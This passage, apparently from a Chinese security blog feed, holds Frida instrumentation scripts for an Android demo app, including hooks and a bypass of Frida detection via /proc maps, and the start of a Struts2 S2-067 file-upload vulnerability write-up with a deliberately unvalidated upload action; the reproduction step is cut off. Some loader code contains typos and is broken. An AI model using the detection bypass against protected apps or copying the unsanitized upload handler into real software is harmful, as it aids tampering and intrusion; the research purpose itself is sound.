<span class="hljs-title function_">CallSecretFunc</span>(<span class="hljs-params"></span>)&#123;<br>   <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>   <br>   <span class="hljs-comment">//动态函数主动调用</span><br>   <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">choose</span>(<span class="hljs-string">&#x27;com.roysue.demo02.MainActivity&#x27;</span>,&#123;<br>     <span class="hljs-attr">onMatch</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">instance</span>)&#123;<br>         instance.<span class="hljs-title function_">secret</span>()<br>     &#125;,<br>     <span class="hljs-attr">onComplete</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>     &#125;<br>     &#125;)<br>   &#125;)<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">gentTotalValue</span>(<span class="hljs-params"></span>)&#123;<br>   <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Inside java perform function&quot;</span>)<br>      <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;com.roysue.demo02.MainActivity&#x27;</span>)<br>      <br>      <span class="hljs-comment">//动态函数主动调用</span><br>      <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">choose</span>(<span class="hljs-string">&#x27;com.roysue.demo02.MainActivity,&#123;</span><br><span class="hljs-string">          onMatch: function(instance)&#123;</span><br><span class="hljs-string">          console.log(&#x27;</span>instance found<span class="hljs-string">&#x27;,instance)</span><br><span class="hljs-string">          instance.secret()</span><br><span class="hljs-string">          console.log(&#x27;</span>total value = <span class="hljs-string">&#x27;,instance.total.value)</span><br><span class="hljs-string">          console.log(&#x27;</span>secret func exec success<span class="hljs-string">&#x27;)&#125;</span><br><span class="hljs-string">          &#125;,</span><br><span class="hljs-string">          onComplete: function()&#123;</span><br><span class="hljs-string">             console.log(&#x27;</span>search <span class="hljs-title class_">Complete</span><span class="hljs-string">&#x27;)</span><br><span class="hljs-string">          &#125;</span><br><span class="hljs-string">      &#125;)</span><br><span class="hljs-string">   &#125;)</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">setImmediate(getTotalValue)</span><br></code></pre></td></tr></table></figure><p>如果调用CallSecretFunc()函数，然后再次获取total的值，就会发现total的值已经变为hello secretFunc</p><p>loader.py</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> frida, sys<br><br>def <span class="hljs-title function_">on_message</span>(message, data):<br>    <span class="hljs-keyword">if</span> message[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;send&#x27;</span>:<br>         <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="hljs-title function_">format</span>(message[<span class="hljs-string">&#x27;payload&#x27;</span>]))<br>     <span class="hljs-attr">else</span>:<br>         <span class="hljs-title function_">print</span>(message)<br>device = frida.<span class="hljs-title function_">get_usb_device</span>()  <span class="hljs-comment">//获取到USB设备句柄</span><br>process = device.<span class="hljs-title function_">attach</span>(<span class="hljs-string">&#x27;com.soysue.demo02&#x27;</span>)  <span class="hljs-comment">//进程注入</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;4.js&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-attr">f</span>:<br>     jscode = f.<span class="hljs-title function_">read</span>()<br>srcipt = process.<span class="hljs-title function_">create_scripy</span>(jscode) <span class="hljs-comment">//加载代码</span><br>sricpt.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;message&#x27;</span>, on_message)  <span class="hljs-comment">//注册自己的消息对应函数</span><br>script.<span class="hljs-title function_">load</span>()<br><br>command = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span> == <span class="hljs-number">1</span> :<br>       commmand = <span class="hljs-title function_">input</span>(<span class="hljs-string">&quot;\nEnter command:\n1:Exit\n: Call secret function\n3:Get Total Value\nchoice&quot;</span>)<br>       <span class="hljs-keyword">if</span> command == <span class="hljs-string">&quot;1&quot;</span>:<br>          <span class="hljs-keyword">break</span><br>       elif command == <span class="hljs-string">&quot;2&quot;</span>:  <span class="hljs-comment">//在这里调用</span><br>          script.<span class="hljs-property">exports</span>.<span class="hljs-title function_">callsecretfunc</span>()<br>       elif command == <span class="hljs-string">&quot;3&quot;</span>:<br>          script.<span class="hljs-property">exports</span>.<span class="hljs-title function_">gettotalvalue</span>()<br></code></pre></td></tr></table></figure><h5 id="frida特征改写"><a href="#frida特征改写" class="headerlink" title="frida特征改写"></a>frida特征改写</h5><hr><p>hook</p><p>hook libc下的pthread_create，打印so</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook_func</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> pthread_creat_addr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;pthread_create&quot;</span>)<br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(pthread_creat_addr,&#123;<br>        <span class="hljs-title function_">onEnter</span>(<span class="hljs-params">args</span>)&#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;call pthread_create...&quot;</span>)<br>            <span class="hljs-keyword">let</span> func_addr = args[<span class="hljs-number">2</span>]<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;The thread function address is &quot;</span> + func_addr)<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;pthread_create called from:\n&#x27;</span><br>            + <span class="hljs-title class_">Thread</span>.<span class="hljs-title function_">backtrace</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">context</span>, <span class="hljs-title class_">Backtracer</span>.<span class="hljs-property">ACCURATE</span>)<br>            .<span class="hljs-title function_">map</span>(<span class="hljs-title class_">DebugSymbol</span>.<span class="hljs-property">fromAddress</span>)<br>            .<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>             + <span class="hljs-string">&#x27;\n&#x27;</span>);<br>        &#125;<br>    &#125;)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>open查看so的加载进程</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> pth = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;open&quot;</span>);<br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(<span class="hljs-title function_">ptr</span>(pth),&#123;<br>        <span class="hljs-attr">onEnter</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>)&#123;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">filename</span> = args[<span class="hljs-number">0</span>];<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable language_">this</span>.<span class="hljs-property">filename</span>.<span class="hljs-title function_">readCString</span>())<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">filename</span>.<span class="hljs-title function_">readCString</span>().<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;.so&quot;</span>) != -<span class="hljs-number">1</span>)&#123;<br>                args[<span class="hljs-number">0</span>] = <span class="hljs-title function_">ptr</span>(<span class="hljs-number">0</span>)<br> <br>            &#125;<br> <br>        &#125;,<span class="hljs-attr">onLeave</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>)&#123;<br>            <span class="hljs-keyword">return</span> retval;<br>        &#125;<br>    &#125;)<br></code></pre></td></tr></table></figure><p>maps检测绕过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> openPtr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">getExportByName</span>(<span class="hljs-string">&#x27;libc.so&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>);  <span class="hljs-comment">//获取libc.so的open函数</span><br>  <span class="hljs-keyword">const</span> open = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeFunction</span>(openPtr, <span class="hljs-string">&#x27;int&#x27;</span>, [<span class="hljs-string">&#x27;pointer&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>]); <span class="hljs-comment">//封装为open函数</span><br>  <span class="hljs-keyword">var</span> readPtr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;read&quot;</span>);  <span class="hljs-comment">//获取libc。so的read函数</span><br>  <span class="hljs-keyword">var</span> read = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeFunction</span>(readPtr, <span class="hljs-string">&#x27;int&#x27;</span>, [<span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;pointer&#x27;</span>, <span class="hljs-string">&quot;int&quot;</span>]); <span class="hljs-comment">//封装变量</span><br>  <span class="hljs-keyword">var</span> fakePath = <span class="hljs-string">&quot;/data/data/com.app/maps&quot;</span>;<br>  <span class="hljs-keyword">var</span> file = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(fakePath, <span class="hljs-string">&quot;w&quot;</span>);  <span class="hljs-comment">//在/data/data/com.app/maps创建文件</span><br>  <span class="hljs-keyword">var</span> buffer = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">alloc</span>(<span class="hljs-number">512</span>); <span class="hljs-comment">//分配了一个512字节的内存缓冲区，用于读取文件内容。</span><br>  <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">replace</span>(openPtr, <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeCallback</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">pathnameptr, flag</span>) &#123; <span class="hljs-comment">//将openPrt进行替换，读取pathnameptr指向c语言字符串，然后转化为javascript字符串</span><br>      <span class="hljs-keyword">var</span> pathname = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(pathnameptr);<br>      <span class="hljs-keyword">var</span> realFd = <span class="hljs-title function_">open</span>(pathnameptr, flag); <span class="hljs-comment">//获得真实的文件描述符</span><br>      <span class="hljs-keyword">if</span> (pathname.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;maps&quot;</span>) &gt;= <span class="hljs-number">0</span>) &#123;  <span class="hljs-comment">//筛选“maps”</span><br>          <span class="hljs-keyword">while</span> (<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">read</span>(realFd, buffer, <span class="hljs-number">512</span>)) !== <span class="hljs-number">0</span>) &#123;<br>              <span class="hljs-keyword">var</span> oneLine = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readCString</span>(buffer);<br>              <span class="hljs-keyword">if</span> (oneLine.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;tmp&quot;</span>) === -<span class="hljs-number">1</span>) &#123;  <span class="hljs-comment">//如果pathname中包含&quot;maps&quot;，则进入一个循环，通过read函数读取文件内容，并将非包含&quot;tmp&quot;的每一行写入file文件中。</span><br>                  file.<span class="hljs-title function_">write</span>(oneLine);<br>              &#125;<br>          &#125;<br>          <span class="hljs-keyword">var</span> filename = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">allocUtf8String</span>(fakePath); <span class="hljs-comment">//分配一个以fakePath为值的UTF-8字符串filename</span><br>          <span class="hljs-keyword">return</span> <span class="hljs-title function_">open</span>(filename, flag);<br>      &#125;<br>      <span class="hljs-keyword">var</span> fd = <span class="hljs-title function_">open</span>(pathnameptr, flag);<br>      <span class="hljs-keyword">return</span> fd;<br>  &#125;, <span class="hljs-string">&#x27;int&#x27;</span>, [<span class="hljs-string">&#x27;pointer&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>]));<br>&#125;<br><span class="hljs-title function_">setImmediate</span>(main)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Apache Struts2文件上传逻辑漏洞S2-067</title>
    <link href="/2025/03/22/Apache-Struts2%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9ES2-067/"/>
    <url>/2025/03/22/Apache-Struts2%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9ES2-067/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01简介"><a href="#0x01简介" class="headerlink" title="0x01简介"></a>0x01简介</h2><p> Apache Struts2 是一个流行的 Java Web 应用程序框架，广泛用于开发企业级应用。该漏洞出现在 Struts2 的文件上传功能中，由于缺乏对上传文件类型的严格验证，攻击者可以绕过文件类型过滤规则，上传恶意文件，从而在目标系统上执行任意代码或开展进一步的攻击。  </p><h2 id="0x02漏洞概述"><a href="#0x02漏洞概述" class="headerlink" title="0x02漏洞概述"></a>0x02漏洞概述</h2><p>FileUploadInterceptor在处理文件上传时可绕过文件类型验证</p><h2 id="0x03漏洞版本"><a href="#0x03漏洞版本" class="headerlink" title="0x03漏洞版本"></a>0x03漏洞版本</h2><p>Struts 2.0.0 - Struts 2.3.37（EOL）<br>Struts 2.5.0 - Struts 2.5.33<br>Struts 6.0.0 - Struts 6.3.0.2</p><h2 id="0x04环境搭建"><a href="#0x04环境搭建" class="headerlink" title="0x04环境搭建"></a>0x04环境搭建</h2><p>idea打开源码，选择本地tomcat，在Deployment中如图所示部署</p><p>pom.xml和相关代码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>untitled<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">packaging</span>&gt;</span>war<span class="hljs-tag">&lt;/<span class="hljs-name">packaging</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>untitled Maven Webapp<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>http://maven.apache.org<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.8.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.struts<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>struts2-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>6.3.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.servlet-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">finalName</span>&gt;</span>untitled<span class="hljs-tag">&lt;/<span class="hljs-name">finalName</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br><br></code></pre></td></tr></table></figure><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs arduino">package com.struts2;<br><br><span class="hljs-keyword">import</span> com.opensymphony.xwork<span class="hljs-number">2.</span>ActionSupport;<br><span class="hljs-keyword">import</span> org.apache.commons.io.FileUtils;<br><span class="hljs-keyword">import</span> org.apache.struts<span class="hljs-number">2.</span>ServletActionContext;<br><br><span class="hljs-keyword">import</span> java.io.<span class="hljs-built_in">File</span>;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UploadsAction</span> extends ActionSupport &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> serialVersionUID = <span class="hljs-number">1L</span>;<br><br>    <span class="hljs-keyword">private</span> List&lt;<span class="hljs-built_in">File</span>&gt; upload; <span class="hljs-comment">// 上传的文件列表</span><br>    <span class="hljs-keyword">private</span> List&lt;<span class="hljs-type">String</span>&gt; uploadContentType; <span class="hljs-comment">// 上传文件的内容类型</span><br>    <span class="hljs-keyword">private</span> List&lt;<span class="hljs-type">String</span>&gt; uploadFileName; <span class="hljs-comment">// 上传文件的名称</span><br>    <span class="hljs-keyword">private</span> List&lt;<span class="hljs-type">String</span>&gt; uploadedFileNames = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayList</span>&lt;<span class="hljs-type">String</span>&gt;(); <span class="hljs-comment">// 存储已上传文件的名称</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;<span class="hljs-built_in">File</span>&gt; <span class="hljs-title">getUpload</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> upload;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">setUpload</span><span class="hljs-params">(List&lt;<span class="hljs-built_in">File</span>&gt; upload)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.upload = upload;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;<span class="hljs-type">String</span>&gt; <span class="hljs-title">getUploadContentType</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> uploadContentType;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">setUploadContentType</span><span class="hljs-params">(List&lt;<span class="hljs-type">String</span>&gt; uploadContentType)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.uploadContentType = uploadContentType;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;<span class="hljs-type">String</span>&gt; <span class="hljs-title">getUploadFileName</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> uploadFileName;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">setUploadFileName</span><span class="hljs-params">(List&lt;<span class="hljs-type">String</span>&gt; uploadFileName)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.uploadFileName = uploadFileName;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;<span class="hljs-type">String</span>&gt; <span class="hljs-title">getUploadedFileNames</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> uploadedFileNames;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-title">doUpload</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-comment">// 使用相对路径</span><br>        <span class="hljs-type">String</span> relativePath = <span class="hljs-string">&quot;upload&quot;</span>; <span class="hljs-comment">// 上传目录</span><br>        <span class="hljs-type">String</span> realPath = ServletActionContext.<span class="hljs-built_in">getServletContext</span>().<span class="hljs-built_in">getRealPath</span>(relativePath); <span class="hljs-comment">// 获取绝对路径</span><br>        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;上传文件的绝对路径: &quot;</span> + realPath);<br><br>        <span class="hljs-comment">// 创建目标目录（如果不存在）</span><br>        <span class="hljs-built_in">File</span> uploadDir = <span class="hljs-keyword">new</span> <span class="hljs-built_in">File</span>(realPath);<br>        <span class="hljs-keyword">if</span> (!uploadDir.<span class="hljs-built_in">exists</span>()) &#123;<br>            uploadDir.<span class="hljs-built_in">mkdirs</span>(); <span class="hljs-comment">// 创建目录</span><br>        &#125;<br><br>        <span class="hljs-comment">// 文件上传逻辑</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; upload.<span class="hljs-built_in">size</span>(); i++) &#123;<br>                <span class="hljs-built_in">File</span> destFile = <span class="hljs-keyword">new</span> <span class="hljs-built_in">File</span>(uploadDir, uploadFileName.<span class="hljs-built_in">get</span>(i)); <span class="hljs-comment">// 目标文件</span><br>                FileUtils.<span class="hljs-built_in">copyFile</span>(upload.<span class="hljs-built_in">get</span>(i), destFile); <span class="hljs-comment">// 复制文件</span><br>                uploadedFileNames.<span class="hljs-built_in">add</span>(uploadFileName.<span class="hljs-built_in">get</span>(i)); <span class="hljs-comment">// 添加到已上传文件列表</span><br>            &#125;<br>        &#125; <span class="hljs-built_in">catch</span> (Exception e) &#123;<br>            e.<span class="hljs-built_in">printStackTrace</span>(); <span class="hljs-comment">// 打印异常</span><br>            <span class="hljs-keyword">return</span> ERROR; <span class="hljs-comment">// 返回错误</span><br>        &#125;<br><br>        <span class="hljs-keyword">return</span> SUCCESS; <span class="hljs-comment">// 返回成功</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="1734665123517-5e1439ea-6039-46eb-8e39-28b8ed363dfb.png" alt="img"></p><p>运行，访问<a href="http://localhost:8080/untitled_war/">http://localhost:8080/untitled_war/</a></p><p><img src="1734665137663-5bf6873a-ac3b-4e54-89c4-c11b3504b016.png" alt="img"></p><p><img src="1734619912639-5155e829-e5cb-4650-8a8b-9f5cd2acc294.png" alt="img"></p><h2 id="0x05-漏洞复现"><a href="#0x05-漏洞复现" class="headerlink" 